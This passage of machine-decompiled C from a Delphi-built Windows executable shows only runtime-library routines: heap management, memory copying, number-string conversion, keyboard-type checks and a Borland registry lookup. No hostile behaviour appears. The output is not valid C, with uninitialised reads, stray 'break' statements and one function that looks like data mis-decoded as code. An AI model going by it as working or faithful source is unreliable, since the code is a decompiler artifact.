        g57 += 4 - v11;
        v9 = v11;
        v10 = v7;
        if ((v8 & 1) == 0) {
            goto lab_0x402296;
        } else {
            int32_t v12 = *(int32_t *)(v6 - 8); // 0x402256
            if (v12 > 11 == (v12 & -0x7ffffffd) == 0) {
                int32_t v13 = v7 - v12; // 0x402277
                if (v12 == *(int32_t *)(v13 + 8)) {
                    // 0x40228d
                    function_401aea();
                    v9 = v12 + v8 & 0x7ffffffc;
                    v10 = v13;
                    goto lab_0x402296;
                } else {
                    // 0x40227e
                    g61 = 10;
                    goto lab_0x40232b;
                }
            } else {
                // 0x402266
                g61 = 10;
                goto lab_0x40232b;
            }
        }
    } else {
        // 0x402227
        g61 = 9;
        goto lab_0x40232b;
    }
  lab_0x402296:;
    int32_t v14 = v10 + v9; // 0x40229e
    if (v14 == g71) {
        // 0x4022aa
        g71 -= v9;
        int32_t v15 = g70 + v9; // 0x4022b0
        g70 = v15;
        if (v15 >= 0x3c01) {
            // 0x4022c2
            function_401dda();
        }
        // 0x4022c7
        function_402f8e(0, (int32_t)&g117);
        int32_t result2 = function_40235b((int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x4022d1
        return result2;
    }
    int32_t * v16 = (int32_t *)v14; // 0x4022d6
    int32_t v17 = *v16; // 0x4022d6
    if ((v17 & 2) == 0) {
        // 0x4022f9
        if (v17 == 0 | *(int32_t *)(v14 + 4) == 0) {
            // 0x40230c
            g61 = 11;
            goto lab_0x40232b;
        } else {
            // 0x402306
            if (*(int32_t *)(v14 + 8) > 11) {
                // 0x402318
                function_401aea();
                // 0x402322
                function_401d52();
                goto lab_0x40232b;
            } else {
                // 0x40230c
                g61 = 11;
                goto lab_0x40232b;
            }
        }
    } else {
        if ((v17 & 0x7ffffffc) == 0) {
            // 0x4022e8
            g61 = 11;
            goto lab_0x40232b;
        } else {
            // 0x4022f4
            *v16 = v17 | 1;
            // 0x402322
            function_401d52();
            goto lab_0x40232b;
        }
    }
  lab_0x40232b:
    // 0x40232b
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x40235b;
    int32_t result3 = 0; // 0x402347
    if (g50 != 0) {
        // 0x402349
        *(int32_t *)(v4 + 4) = (int32_t)&g62;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
        result3 = &g117;
    }
    // 0x402353
    return result3;
}

// Address range: 0x402354 - 0x402359
int32_t function_402354(void) {
    // 0x402354
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x402359 - 0x40235b
int32_t function_402359(void) {
    // 0x402359
    int32_t result; // 0x402359
    return result;
}

// Address range: 0x40235b - 0x402364
int32_t function_40235b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40235b
    int32_t v1; // 0x40235b
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x402366 - 0x402540
int32_t function_402366(void) {
    // 0x402366
    int32_t v1; // 0x402366
    int32_t v2 = v1 + 7 & -4; // 0x402372
    int32_t v3 = v2 > 12 ? v2 : 12;
    int32_t v4; // 0x402366
    int32_t v5 = v4 - 4; // 0x402381
    int32_t * v6 = (int32_t *)v5; // 0x402384
    int32_t v7 = *v6 & 0x7ffffffc; // 0x402387
    int32_t v8 = v7 + v5; // 0x40238f
    if (v7 == v3) {
        // 0x402539
        return v8 & -256 | 1;
    }
    int32_t v9; // 0x402366
    if (v7 > v3) {
        int32_t v10 = v7 - v3; // 0x4023a8
        int32_t v11 = g71; // 0x4023ad
        if (v8 != v11) {
            int32_t v12 = v10; // 0x4023f2
            if ((*(char *)v8 & 2) == 0) {
                // 0x4023f4
                function_401aea();
                v12 = *(int32_t *)(v8 + 8) + v10;
            }
            // 0x402401
            v9 = v7;
            if (v12 >= 12) {
                // 0x402407
                *(int32_t *)(v3 + v5) = v12 | 2;
                function_401bae();
                v9 = v3;
            }
        } else {
            // 0x4023b5
            g71 = v11 - v10;
            int32_t v13 = g70; // 0x4023c1
            int32_t v14 = v13 + v10; // 0x4023c1
            g70 = v14;
            v9 = v3;
            if (v14 <= 11) {
                // 0x4023d4
                g71 = v11;
                g70 = v13;
                v9 = v7;
            }
        }
        goto lab_0x402520;
      lab_0x402520:
        // 0x402520
        g57 += v9 - v7;
        int32_t v15 = *v6; // 0x40252a
        *v6 = v15 & -0x7ffffffd | v9;
        // 0x402539
        return v15 & -0x80000000 | 1;
    }
    uint32_t v16 = v3 - v7;
    if (v8 == g71) {
        // 0x402439
        if (g70 >= v16) {
            // break -> 0x402444
            break;
        }
        // 0x402497
        function_401dda();
    }
    int32_t v17 = v8; // 0x4024a3
    uint32_t v18; // 0x4024a9
    int32_t v19; // 0x4024cf
    int32_t v20; // 0x4024e6
    int32_t * v21; // 0x4024ed
    if ((*(char *)v8 & 2) == 0) {
        // 0x4024a5
        v18 = *(int32_t *)(v8 + 8);
        if (v18 >= v16) {
            // 0x4024c6
            function_401aea();
            v19 = v18 - v16;
            if (v19 < 12) {
                // 0x4024e6
                v20 = v19 + v3;
                v21 = (int32_t *)(v20 + v5);
                *v21 = *v21 & -2;
                v9 = v20;
                goto lab_0x402520;
            } else {
                // 0x4024d8
                function_401d52();
                v9 = v3;
                goto lab_0x402520;
            }
        }
        // 0x4024b8
        v17 = v18 + v8;
    }
    while (*(int32_t *)v17 <= -1 && (char)function_401ede() != 0) {
        // 0x402429
        if (v8 == g71) {
            // 0x402439
            if (g70 >= v16) {
                // break -> 0x402444
                break;
            }
            // 0x402497
            function_401dda();
        }
        // 0x4024a0
        v17 = v8;
        if ((*(char *)v8 & 2) == 0) {
            // 0x4024a5
            v18 = *(int32_t *)(v8 + 8);
            if (v18 >= v16) {
                // 0x4024c6
                function_401aea();
                v19 = v18 - v16;
                if (v19 < 12) {
                    // 0x4024e6
                    v20 = v19 + v3;
                    v21 = (int32_t *)(v20 + v5);
                    *v21 = *v21 & -2;
                    v9 = v20;
                    goto lab_0x402520;
                } else {
                    // 0x4024d8
                    function_401d52();
                    v9 = v3;
                    goto lab_0x402520;
                }
            }
            // 0x4024b8
            v17 = v18 + v8;
        }
    }
    // 0x402539
    return 0;
}

// Address range: 0x402542 - 0x4025f3
int32_t function_402542(int32_t a1) {
    // 0x402542
    if (g60 == 0) {
        // 0x402556
        int32_t v1; // 0x402542
        if ((char)function_401946(v1) == 0) {
            int32_t result = function_4025fa(0, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x402564
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x402571
    int32_t v3 = &v2; // 0x402571
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x40257e
    if (g50 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g62; // bp-36, 0x402580
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g62);
        v4 = (int32_t)&v5;
    }
    // 0x40258a
    if ((char)function_402366() == 0) {
        // 0x40259c
        if (function_402032() != 0) {
            // 0x4025be
            function_40270a();
            function_4021c2();
        }
    }
    // 0x4025d2
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x4025fa;
    int32_t result2 = 0; // 0x4025e6
    if (g50 != 0) {
        // 0x4025e8
        *(int32_t *)(v4 + 4) = (int32_t)&g62;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g117);
        result2 = &g117;
    }
    // 0x4025f2
    return result2;
}

// Address range: 0x4025f3 - 0x4025f8
int32_t function_4025f3(void) {
    // 0x4025f3
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4025f8 - 0x4025fa
int32_t function_4025f8(void) {
    // 0x4025f8
    int32_t result; // 0x4025f8
    return result;
}

// Address range: 0x4025fa - 0x402603
int32_t function_4025fa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4025fa
    int32_t v1; // 0x4025fa
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x402606 - 0x402626
int32_t function_402606(void) {
    // 0x402606
    int32_t v1; // 0x402606
    if (v1 < 1) {
        // 0x402622
        return 0;
    }
    int32_t result = function_402032(); // 0x40260b
    if (result != 0) {
        // 0x402622
        return result;
    }
    // 0x402617
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x402626 - 0x402646
int32_t function_402626(void) {
    // 0x402626
    int32_t v1; // 0x402626
    if (v1 == 0 || function_4021c2() == 0) {
        // 0x402642
        return 0;
    }
    // 0x402637
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x402646 - 0x402693
int32_t function_402646(void) {
    // 0x402646
    int32_t v1; // 0x402646
    int32_t v2; // 0x402646
    if (v2 == 0) {
        // 0x40267e
        if (v1 == 0) {
            // 0x402676
            return 0;
        }
        // 0x402682
        if (function_402032() != 0) {
            // 0x402690
            abort();
            // UNREACHABLE
        }
        // 0x402677
        function_4026ee((int32_t)&g117);
        // UNREACHABLE
    }
    if (v1 == 0) {
        // 0x402668
        *(int32_t *)v2 = 0;
        int32_t result = function_4021c2(); // 0x40266c
        if (result == 0) {
            // 0x402676
            return result;
        }
        // 0x402661
        function_4026ee((int32_t)&g117);
        // UNREACHABLE
    }
    int32_t result2 = function_402542(v2); // 0x402653
    if (result2 != 0) {
        // 0x40265e
        *(int32_t *)v2 = result2;
        return result2;
    }
    // 0x402677
    function_4026ee((int32_t)&g117);
    // UNREACHABLE
}

// Address range: 0x402696 - 0x4026a1
int32_t function_402696(void) {
    // 0x402696
    function_4034a6();
    // UNREACHABLE
}

// Address range: 0x4026a1 - 0x4026a2
int32_t function_4026a1(void) {
    // 0x4026a1
    int32_t result; // 0x4026a1
    return result;
}

// Address range: 0x4026a2 - 0x4026e9
int32_t function_4026a2(void) {
    // 0x4026a2
    int32_t v1; // 0x4026a2
    if ((v1 & 127) == 0) {
        // 0x4026c2
        function_4043be();
    }
    // 0x4026de
    function_402696();
    // UNREACHABLE
}

// Address range: 0x4026e9 - 0x4026ec
int32_t function_4026e9(int32_t a1, int32_t a2) {
    // 0x4026e9
    int32_t result; // 0x4026e9
    return result;
}

// Address range: 0x4026ee - 0x4026f9
int32_t function_4026ee(int32_t a1) {
    // 0x4026ee
    return function_4026a2();
}

// Address range: 0x4026f9 - 0x4026fa
int32_t function_4026f9(void) {
    // 0x4026f9
    int32_t result; // 0x4026f9
    return result;
}

// Address range: 0x4026fa - 0x40270a
int32_t function_4026fa(int32_t a1, int32_t a2) {
    // 0x4026fa
    return function_4043be();
}

// Address range: 0x40270a - 0x40274a
int32_t function_40270a(void) {
    // 0x40270a
    uint32_t v1; // 0x40270a
    uint32_t result; // 0x40270a
    uint32_t v2; // 0x40270a
    if (v1 > v2) {
        if (result >= 0) {
            int32_t v3 = result - 4; // 0x402729
            int32_t v4 = v3 + v1; // 0x40272d
            int32_t v5 = result / 4; // 0x402731
            __asm_rep_movsd_memcpy((char *)v4, (char *)(v3 + v2), v5);
            char * v6 = (char *)((-4 * v5 | 3) + v4); // 0x402744
            __asm_rep_movsb_memcpy(v6, v6, result & 3);
        }
        // 0x402747
        return result;
    }
    if (v1 == v2) {
        // 0x402747
        return result;
    }
    if (result < 0) {
        // 0x402747
        return result;
    }
    int32_t v7 = (int32_t)result / 4; // 0x402718
    __asm_rep_movsd_memcpy((char *)v1, (char *)v2, v7);
    bool v8; // 0x40270a
    char * v9 = (char *)((v8 ? -4 : 4) * v7 + v1); // 0x402724
    __asm_rep_movsb_memcpy(v9, v9, result & 3);
    return result;
}

// Address range: 0x40274a - 0x40276f
int32_t function_40274a(void) {
    // 0x40274a
    int32_t lpPerformanceCount; // bp-8, 0x40274a
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        int32_t result = GetTickCount(); // 0x402762
        g10 = result;
        return result;
    }
    int32_t result2 = &lpPerformanceCount; // 0x402757
    g10 = result2;
    return result2;
}

// Address range: 0x402772 - 0x402781
int32_t function_402772(void) {
    // 0x402772
    int32_t v1; // 0x402772
    g14 = v1;
    return __asm_fnclex();
}

// Address range: 0x402782 - 0x402789
int32_t function_402782(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x402782
    return 0;
}

// Address range: 0x40278a - 0x4027e0
int32_t function_40278a(void) {
    // 0x40278a
    int32_t v1; // 0x40278a
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x402790
    int32_t result; // 0x40278a
    int32_t v3; // 0x40278a
    int32_t v4; // 0x40278a
    if (v2 < 0xd7b4) {
        int32_t v5 = (v2 & -0x284e) != -0x284e ? 0 : v1;
        int32_t v6 = v5 != 0 ? v5 : v1;
        result = 0;
        if (v6 != 0) {
            // 0x4027c0
            function_4026fa(v4, v3);
            result = v6;
        }
    } else {
        // 0x4027c9
        result = 0;
        if (v1 != (int32_t)&g52) {
            // 0x4027d1
            function_4026fa(v4, v3);
            result = 0;
        }
    }
    // 0x4027db
    return result;
}

// Address range: 0x4027e2 - 0x4027fd
int32_t function_4027e2(void) {
    // 0x4027e2
    int32_t v1; // 0x4027e2
    unsigned char v2 = (char)v1;
    int32_t v3; // 0x4027e2
    unsigned char v4 = (char)v3;
    int32_t v5; // 0x4027e2
    *(char *)v5 = v2 < v4 ? v2 : v4;
    return function_40270a();
}

// Address range: 0x4027fe - 0x40286d
int32_t function_4027fe(void) {
    // 0x4027fe
    uint32_t v1; // 0x4027fe
    int32_t v2 = (uint32_t)(v1 / 4); // 0x402806
    int32_t result; // 0x4027fe
    int32_t v3; // 0x4027fe
    if (v1 < 4) {
        goto lab_0x40282e;
      lab_0x40282e:;
        int32_t v4 = v1 & 3; // 0x40282f
        if (v4 == 0 || *(char *)result != *(char *)v3) {
            // 0x402850
            return result;
        }
        int32_t v5 = v4 - 1; // 0x40283a
        if (v5 == 0) {
            // 0x402850
            return 0;
        }
        // 0x40283d
        if (*(char *)(result + 1) != *(char *)(v3 + 1)) {
            // 0x402850
            return result;
        }
        // 0x402845
        if (v5 == 1 || *(char *)(result + 2) == *(char *)(v3 + 2)) {
            // 0x402850
            return 0;
        }
        // 0x402850
        return result;
    }
    int32_t v6; // 0x4027fe
    int32_t v7 = v6;
    int32_t v8; // 0x4027fe
    int32_t result2 = v8;
    while (*(int32_t *)result2 == *(int32_t *)v7) {
        int32_t v9 = result2 + 4;
        if (v2 == 1) {
            // 0x402828
            result = v9;
            v3 = v7 + 4;
            goto lab_0x40282e;
        }
        // 0x402813
        if (*(int32_t *)v9 != *(int32_t *)(v7 + 4)) {
            // break -> 0x40286a
            break;
        }
        int32_t v10 = result2 + 8; // 0x40281d
        int32_t v11 = v7 + 8; // 0x402820
        v2 -= 2;
        result = v10;
        v3 = v11;
        if (v2 == 0) {
            goto lab_0x40282e;
        }
        v7 = v11;
        result2 = v10;
    }
    // 0x402850
    return result2;
}

// Address range: 0x40286e - 0x40288d
int32_t function_40286e(void) {
    // 0x40286e
    int32_t v1; // 0x40286e
    int32_t v2 = 256 * v1 & 0xff00 | v1 & -0xff01; // 0x402871
    int32_t result = 0x10000 * v2 | v2 & 0xffff; // 0x402878
    uint32_t v3; // 0x40286e
    if (v3 >= 0) {
        int32_t v4 = v3 / 4; // 0x40287d
        int32_t v5; // 0x40286e
        __asm_rep_stosd_memset((char *)v5, result, v4);
        bool v6; // 0x40286e
        int32_t v7 = v6 ? -4 : 4; // 0x402882
        __asm_rep_stosb_memset((char *)(v7 * v4 + v5), (char)v1, v3 & 3);
    }
    // 0x40288b
    return result;
}

// Address range: 0x40288e - 0x4028ed
int32_t function_40288e(void) {
    // 0x40288e
    int32_t v1; // bp-36, 0x40288e
    int32_t v2 = &v1; // 0x402892
    int32_t v3 = 0;
    int32_t v4; // 0x40288e
    uint32_t v5 = v4 < 0 ? -v4 : v4;
    int32_t v6 = v5 / 10; // 0x4028a7
    *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
    int32_t v7 = v3 + 1; // 0x4028af
    while (v5 >= 10) {
        // 0x4028a5
        v3 = v7;
        v5 = v6;
        v6 = v5 / 10;
        *(char *)(v3 + v2) = (char)(v5 % 10) | 48;
        v7 = v3 + 1;
    }
    int32_t v8 = v7; // 0x4028b6
    if (v4 < 0) {
        // 0x4028b8
        *(char *)(v7 + v2) = 45;
        v8 = v3 + 2;
    }
    char v9 = v8; // 0x4028bd
    int32_t v10; // 0x40288e
    char * v11 = (char *)v10; // 0x4028bd
    *v11 = v9;
    int32_t v12 = v10 + 1; // 0x4028bf
    int32_t v13; // 0x40288e
    int32_t v14 = v13 < 255 ? v13 : 255;
    int32_t v15 = v6; // 0x4028d3
    int32_t v16 = v12; // 0x4028d3
    if (v14 > v8) {
        int32_t v17 = v14 - v8; // 0x4028d1
        *v11 = (char)v17 + v9;
        __asm_rep_stosb_memset((char *)v12, 32, v17);
        v15 = v6 & 0x1fffff00 | 32;
        bool v18; // 0x40288e
        v16 = v17 * (v18 ? -1 : 1) + v12;
    }
    int32_t result = v15; // 0x4028dc
    int32_t v19 = v8;
    int32_t v20 = v16; // 0x40288e
    v19--;
    unsigned char v21 = *(char *)(v19 + v2); // 0x4028dc
    result = result & -256 | (int32_t)v21;
    *(char *)v20 = v21;
    v20++;
    while (v19 != 0) {
        // 0x4028dc
        v19--;
        v21 = *(char *)(v19 + v2);
        result = result & -256 | (int32_t)v21;
        *(char *)v20 = v21;
        v20++;
    }
    // 0x4028e6
    return result;
}

// Address range: 0x4028ee - 0x4028f8
int32_t function_4028ee(int32_t a1, int32_t a2) {
    // 0x4028ee
    return function_40288e();
}

// Address range: 0x4028fa - 0x4029cb
int32_t function_4028fa(void) {
    // 0x4028fa
    int32_t v1; // 0x4028fa
    int32_t v2; // 0x4028fa
    int32_t v3; // 0x4028fa
    int32_t v4; // 0x4028fa
    int32_t v5; // 0x4028fa
    int32_t v6; // 0x4028fa
    int32_t v7; // 0x40290d
    int32_t v8; // 0x40290f
    if (v6 == 0) {
        goto lab_0x402979;
    } else {
        while (true) {
          lab_0x40290d:;
            // 0x40290d
            int32_t v9; // 0x4028fa
            v4 = v9;
            unsigned char v10 = *(char *)v4; // 0x40290d
            int32_t v11; // 0x4028fa
            v7 = v11 & -256;
            int32_t v12 = v7 | (int32_t)v10; // 0x40290d
            v8 = v4 + 1;
            v11 = v12;
            v9 = v8;
            v2 = 0;
            v1 = v12;
            v5 = v8;
            v3 = 256;
            switch (v10) {
                case 32: {
                    goto lab_0x40290d;
                }
                case 45: {
                    goto lab_0x402980;
                }
                case 43: {
                    // 0x402980
                    v3 = 0;
                    goto lab_0x402980;
                }
                default: {
                    goto lab_0x402921;
                }
            }
        }
    }
  lab_0x402966:;
    // 0x402966
    int32_t v13; // 0x4028fa
    int32_t result2; // 0x4028fa
    int32_t v14; // 0x4028fa
    if ((v2 & 0xff00) == 256) {
        int32_t result = -v13; // 0x402973
        if (v13 == 0 || result < 0) {
            // 0x4029c5
            *(int32_t *)v14 = 0;
            return result;
        }
    } else {
        // 0x40296a
        result2 = v13;
        if (v13 >= 0) {
          lab_0x4029c5:
            // 0x4029c5
            *(int32_t *)v14 = 0;
            return result2;
        }
    }
    goto lab_0x402979;
  lab_0x402980:
    // 0x402980
    v2 = v3;
    v1 = v7 | (int32_t)*(char *)v8;
    v5 = v4 + 2;
    goto lab_0x402921;
  lab_0x402921:;
    char v38 = v1; // 0x402921
    int32_t v19 = v1; // 0x4028fa
    int32_t v16 = v5; // 0x4028fa
    int32_t v32; // 0x4028fa
    int32_t v30; // 0x4028fa
    switch (v38) {
        case 36: {
            goto lab_0x402985;
        }
        case 120: {
            goto lab_0x402985;
        }
        case 88: {
            goto lab_0x402985;
        }
        default: {
            if (v38 != 48) {
                // 0x402948
                v32 = v1;
                v30 = v5;
                if (v38 == 0) {
                    goto lab_0x402979;
                } else {
                    goto lab_0x40294c;
                }
            } else {
                unsigned char v39 = *(char *)v5; // 0x402935
                int32_t v40 = v1 & -256 | (int32_t)v39; // 0x402935
                int32_t v41 = v5 + 1; // 0x402937
                v32 = v40;
                v30 = v41;
                v13 = 0;
                v19 = v40;
                v16 = v41;
                switch (v39) {
                    case 120: {
                        goto lab_0x402985;
                    }
                    case 88: {
                        goto lab_0x402985;
                    }
                    case 0: {
                        goto lab_0x402966;
                    }
                    default: {
                        goto lab_0x40294c;
                    }
                }
            }
        }
    }
  lab_0x402970:
    // 0x402970
    goto lab_0x402979;
  lab_0x402979:
    // 0x4029c5
    *(int32_t *)v14 = 1 - v6;
    return 0;
  lab_0x402985:;
    unsigned char v15 = *(char *)v16; // 0x40298a
    if (v15 == 0) {
        goto lab_0x402970;
    } else {
        int32_t v17 = v16 + 1;
        int32_t v18 = v19 & -256 | (int32_t)v15;
        int32_t v20 = 0;
        int32_t v21 = v18; // 0x402994
        if ((char)v18 >= 97) {
            // 0x402996
            v21 = v18 + 224 & 255 | v18 & -256;
        }
        int32_t v22 = v21;
        int32_t v23 = v22 + 208; // 0x402999
        unsigned char v24 = (char)v23; // 0x40299c
        int32_t v25 = v23; // 0x40299f
        if (v24 >= 10) {
            // 0x4029a1
            if (v24 >= 23) {
                // break -> 0x402979
                break;
            }
            // 0x4029a9
            v25 = v22 + 201;
        }
        // 0x4029ac
        while (v20 <= 0xfffffff) {
            int32_t v26 = v22 & -256; // 0x402999
            int32_t v27 = (v25 & 255 | v26) + 16 * v20; // 0x4029b3
            unsigned char v28 = *(char *)v17; // 0x4029b5
            if (v28 == 0) {
                // 0x4029bc
                result2 = (v2 & 0xff00) != 256 ? v27 : -v27;
                goto lab_0x4029c5;
            }
            v17++;
            v18 = v26 | (int32_t)v28;
            v20 = v27;
            v21 = v18;
            if ((char)v18 >= 97) {
                // 0x402996
                v21 = v18 + 224 & 255 | v18 & -256;
            }
            // 0x402999
            v22 = v21;
            v23 = v22 + 208;
            v24 = (char)v23;
            v25 = v23;
            if (v24 >= 10) {
                // 0x4029a1
                if (v24 >= 23) {
                    // break -> 0x402979
                    break;
                }
                // 0x4029a9
                v25 = v22 + 201;
            }
        }
        goto lab_0x402979;
    }
  lab_0x40294c:;
    int32_t v29 = v30;
    int32_t v31 = v32;
    int32_t v33 = 0;
    int32_t v34 = v31 + 208; // 0x40294c
    while (v33 <= 0xccccccc && (char)v34 <= 9) {
        int32_t v35 = v31 & -256; // 0x40294c
        int32_t v36 = (v34 & 255 | v35) + 10 * v33; // 0x40295d
        unsigned char v37 = *(char *)v29; // 0x40295f
        v13 = v36;
        if (v37 == 0) {
            goto lab_0x402966;
        }
        v29++;
        v31 = v35 | (int32_t)v37;
        v33 = v36;
        v34 = v31 + 208;
    }
    goto lab_0x402979;
}

// Address range: 0x4029ce - 0x4029d9
int32_t function_4029ce(void) {
    // 0x4029ce
    return function_4029da();
}

// Address range: 0x4029da - 0x4029fd
int32_t function_4029da(void) {
    // 0x4029da
    uint32_t v1; // 0x4029da
    int32_t v2 = v1 < 255 ? v1 : 255; // 0x4029f3
    int32_t v3; // 0x4029da
    char v4 = *(char *)v3; // 0x4029e9
    int32_t v5; // 0x4029da
    int32_t v6 = v5; // 0x4029ee
    while (v4 != 0) {
        int32_t v7 = v5 + 1; // 0x4029f0
        *(char *)v7 = v4;
        v2--;
        v5 = v7;
        v3++;
        v6 = v7;
        if (v2 == 0) {
            // break -> 0x4029f6
            break;
        }
        v4 = *(char *)v3;
        v6 = v5;
    }
    // 0x4029f6
    int32_t v8; // 0x4029da
    int32_t result = v6 - v8; // 0x4029f7
    *(char *)v8 = (char)result;
    return result;
}

// Address range: 0x4029fe - 0x402a04
int32_t function_4029fe(int32_t nTypeFlag) {
    // 0x4029fe
    return GetKeyboardType(nTypeFlag);
}

// Address range: 0x402a06 - 0x402a35
int32_t function_402a06(void) {
    // 0x402a06
    int32_t nTypeFlag; // 0x402a06
    if (GetKeyboardType(nTypeFlag) != 7) {
        // 0x402a31
        return 0;
    }
    int32_t v1 = GetKeyboardType(1) & 0xff00; // 0x402a1c
    return v1 == 1024 | v1 == 3328;
}

// Address range: 0x402a36 - 0x402acd
int32_t function_402a36(void) {
    // 0x402a36
    int32_t v1; // bp-8, 0x402a36
    int32_t v2; // 0x402a36
    int32_t v3 = function_401216(v2, (int32_t)g14, &v1, 1, 0, "SOFTWARE\\Borland\\Delphi\\RTL", -0x7ffffffe); // 0x402a58
    if (v3 != 0) {
        int16_t v4 = g14 & -64 | g14 & 63; // 0x402ac0
        g14 = v4;
        return v3 & -0x10000 | (int32_t)v4;
    }
    int32_t v5 = __readfsdword(0); // bp-48, 0x402a69
    __writefsdword(0, (int32_t)&v5);
    function_40121e(4);
    __writefsdword(0, v1);
    return function_40120e(v1);
}

// Address range: 0x402acd - 0x402bb0
int32_t function_402acd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18) {
    int32_t v1 = a1;
    int32_t v2 = a6;
    int32_t v3; // 0x402acd
    char * v4 = (char *)(v3 + 79); // 0x402acd
    unsigned char v5 = *v4; // 0x402acd
    int32_t v6; // 0x402acd
    unsigned char v7 = v5 + (char)v6; // 0x402acd
    *v4 = v7;
    int32_t v8; // 0x402acd
    __asm_outsd((int16_t)v6 + 1, *(int32_t *)(v8 + 1));
    if (v7 < v5) {
        // 0x402b47
        return function_402c8e();
    }
    int16_t v9 = a16; // 0x402adc
    __asm_outsb(v9, (char)a18);
    int32_t v10; // 0x402acd
    *(char *)v10 = __asm_insb(v9);
    int64_t v11 = (int64_t)*(int32_t *)(a16 + 84 + 2 * a16); // 0x402ae4
    int32_t v12 = a7; // 0x402aef
    int32_t result = a9; // 0x402aef
    int32_t * v13 = &v2; // 0x402aef
    int32_t v14 = a18; // 0x402aef
    if (0x5046004c * v11 != 0x5046004c00000000 * v11 / 0x100000000) {
        // 0x402af1
        v12 = v1;
        *(char *)a12 = __asm_insb((int16_t)a3);
        if (a18 == 1) {
            char * v15 = (char *)v12; // 0x402af6
            *v15 = *v15 + 2 * (char)v12;
            return __asm_wait();
        }
        // 0x402b5b
        v1 = v2;
        result = a3;
        v13 = &v1;
        v14 = a12;
    }
    int32_t v16 = (int32_t)v13;
    int32_t v17 = v16 - 4; // 0x402b5c
    *(int32_t *)v17 = v14;
    *(int32_t *)result = v12;
    bool v18; // 0x402acd
    int32_t v19 = v18 ? -4 : 4; // 0x402b61
    int32_t v20 = result + v19; // 0x402b61
    uint32_t v21 = *(int32_t *)(v12 - 40); // 0x402b62
    int32_t * v22 = (int32_t *)(v16 - 8); // 0x402b67
    *v22 = v21;
    int32_t v23 = v21 / 4 - 1; // 0x402b6b
    __asm_rep_stosd_memset((char *)v20, 0, v23);
    __asm_rep_stosb_memset((char *)(v23 * v19 + v20), 0, *v22 & 3);
    int32_t v24 = *(int32_t *)(v12 - 72); // 0x402b78
    int32_t v25 = v17; // 0x402b7d
    if (v24 != 0) {
        // 0x402b7f
        v25 = v17 - 4;
        *(int32_t *)v25 = v24;
    }
    int32_t v26 = v25;
    int32_t v27 = *(int32_t *)(v12 - 36); // 0x402b80
    while (v27 != 0) {
        int32_t v28 = *(int32_t *)v27; // 0x402b87
        int32_t v29 = v26;
        v24 = *(int32_t *)(v28 - 72);
        v25 = v29;
        if (v24 != 0) {
            // 0x402b7f
            v25 = v29 - 4;
            *(int32_t *)v25 = v24;
        }
        // 0x402b80
        v26 = v25;
        v27 = *(int32_t *)(v28 - 36);
    }
    // 0x402b8b
    if (v26 == v17) {
        // 0x402bac
        return result;
    }
    int32_t v30 = v26; // 0x402b8d
    int32_t v31 = *(int32_t *)v30; // 0x402b8f
    int32_t v32 = *(int32_t *)v31; // 0x402b92
    int32_t v33 = v31 + 4;
    int32_t v34 = *(int32_t *)(v33 + 16); // 0x402b95
    if (v34 != 0) {
        // 0x402b9c
        *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
    }
    // 0x402ba2
    v32--;
    int32_t v35 = v33 + 28; // 0x402ba6
    while (v32 != 0) {
        // 0x402b95
        v33 = v35;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402b9c
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402ba2
        v32--;
        v35 = v33 + 28;
    }
    // 0x402ba8
    v30 += 4;
    while (v30 != v17) {
        // 0x402b8f
        v31 = *(int32_t *)v30;
        v32 = *(int32_t *)v31;
        v33 = v31 + 4;
        v34 = *(int32_t *)(v33 + 16);
        if (v34 != 0) {
            // 0x402b9c
            *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
        }
        // 0x402ba2
        v32--;
        v35 = v33 + 28;
        while (v32 != 0) {
            // 0x402b95
            v33 = v35;
            v34 = *(int32_t *)(v33 + 16);
            if (v34 != 0) {
                // 0x402b9c
                *(int32_t *)(*(int32_t *)(v33 + 20) + result) = v34;
            }
            // 0x402ba2
            v32--;
            v35 = v33 + 28;
        }
        // 0x402ba8
        v30 += 4;
    }
    // 0x402bac
    return result;
}

// Address range: 0x402bb2 - 0x402bd2
int32_t function_402bb2(int32_t a1) {
    int32_t v1; // 0x402bb2
    int32_t v2 = *(int32_t *)v1; // 0x402bb8
    int32_t v3 = *(int32_t *)(v2 - 36); // 0x402bbd
    if (*(int32_t *)(v2 - 64) != 0) {
        // 0x402bc4
        function_403a6e();
    }
    // 0x402bb2
    while (v3 != 0) {
        // 0x402bb8
        v2 = *(int32_t *)v3;
        v3 = *(int32_t *)(v2 - 36);
        if (*(int32_t *)(v2 - 64) != 0) {
            // 0x402bc4
            function_403a6e();
        }
    }
    // 0x402bcf
    int32_t result; // 0x402bb2
